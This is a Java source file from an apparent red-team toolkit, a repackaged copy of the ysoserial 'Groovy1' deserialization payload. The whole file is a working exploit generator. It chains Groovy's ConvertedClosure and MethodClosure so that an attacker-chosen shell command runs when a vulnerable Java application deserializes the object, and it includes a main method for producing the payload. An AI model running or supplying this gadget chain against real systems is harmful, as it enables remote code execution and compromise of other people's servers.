package com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads;

import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Authors;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Dependencies;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.Gadgets;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.PayloadRunner;
import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;

import java.lang.reflect.InvocationHandler;
import java.util.Map;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"org.codehaus.groovy:groovy:2.3.9"})
@Authors({Authors.FROHOFF})
public class Groovy1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {

    @Override
    public InvocationHandler getObject(final String command) throws Exception {
        final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(command, "execute"), "entrySet");
        final Map map = Gadgets.createProxy(closure, Map.class);
        return Gadgets.createMemoizedInvocationHandler(map);
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(Groovy1.class, args);
    }
}
